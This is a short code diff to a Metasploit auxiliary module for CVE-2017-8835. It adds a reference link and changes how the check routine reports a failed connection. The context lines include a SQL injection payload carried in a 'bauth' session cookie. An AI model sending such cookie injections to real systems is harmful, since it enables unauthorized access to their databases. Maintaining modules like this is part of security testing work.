@@ -26,6 +26,7 @@ class MetasploitModule < Msf::Auxiliary
           [
             [ 'EDB', '42130' ],
             [ 'CVE', '2017-8835' ],
+            [ 'URL', 'https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a' ]
           ],
         'Targets' => [['Wildcard Target', {}]],
         'DefaultTarget' => 0
@@ -196,7 +197,7 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'GET',
         'cookie' => "bauth=' or #{payload}--"
       })
-      fail_with 'Unable to connect to target' unless res
+      return Exploit::CheckCode::Unknown("Unable to connect to #{target_uri.path}") unless res
       res.get_cookies.empty? # no Set-Cookie header means the session cookie is valid
     end
     if @sqli.test_vulnerable
